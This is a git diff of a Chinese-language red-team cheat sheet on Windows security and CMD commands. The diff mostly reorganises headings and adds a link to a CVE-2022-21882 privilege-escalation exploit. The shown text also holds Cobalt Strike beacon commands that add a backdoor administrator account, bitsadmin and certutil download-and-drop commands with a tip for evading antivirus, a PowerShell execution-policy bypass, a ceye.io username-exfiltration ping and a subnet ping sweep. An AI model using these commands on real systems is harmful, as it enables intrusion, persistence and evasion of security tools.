@@ -1,8 +1,20 @@
-# CMD 命令用法记录
+# Windows 安全
 
 ---
 
-# 网络常用
+## 本地提权
+
+[windows提权-CVE-2022-21882](https://github.com/KaLendsi/CVE-2022-21882)
+
+
+
+---
+
+## CMD 命令用法记录
+
+---
+
+## 网络常用
 **ipconfig**
 ```cmd
 ipconfig /all 显示完整配置信息
@@ -121,7 +133,7 @@ net password 密码 更改系统登陆密码
 
 ---
 
-# 系统信息
+## 系统信息
 `ver` windows版本
 
 `msinfo32`  系统信息面板
@@ -150,7 +162,7 @@ slmgr.vbs -skms :(name[ort] )批量授权
 
 ---
 
-# 常用
+## 常用
 
 **shutdown**
 ```cmd
@@ -223,7 +235,7 @@ ping %USERNAME%.xxxxx.ceye.io
 
 CMD 扫描主机
 ```bash
-# 探测一个C网段有多少台主机
+## 探测一个C网段有多少台主机
 
 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
 ```
@@ -233,7 +245,7 @@ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
 ![](img/1.png)
 
 
-### 常见提权
+###### 常见提权
 
 1. 查看目标服务器上的打的补丁，看看哪些可以使用poc打
 
@@ -243,27 +255,27 @@ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
 
 ```
 beacon> argue net1 /bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass
-beacon> run net1 user what t1!@#1dsdfq3 /add
+beacon> run net1 user what t1!@##1dsdfq3 /add
 beacon> run net1 localgroup administrators what /add
 ```
 
 
-# LOL
+## LOL
 
 
-### bitsadmin
+###### bitsadmin
 
 系统要求 >= Windows Vista
 bitsadmin /transfer down /download /priority normal "http://www.xxx.com/xxx.exe" "F:\1.exe"
 
 
-### certutil
+###### certutil
 
 建议先执行一遍 certutil,再执行下方命令(可能可以绕火绒、360等杀软)
 certutil -urlcache -split -f http://www.xxx.com/xxx.exe 1.exe
 
 
-### powershell
+###### powershell
 
 同样,攻击机起http服务
 ```powershell-download
@@ -281,7 +293,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 
 
 
-### 远程下载
+###### 远程下载
 
 certutil 还可用于从互联网下载文件。
 
@@ -292,7 +304,7 @@ certutil.exe -urlcache -split -f http://example.com/a.txt
 
 
 
-### 程序降权启动方法
+###### 程序降权启动方法
 
 第一种：runas
 
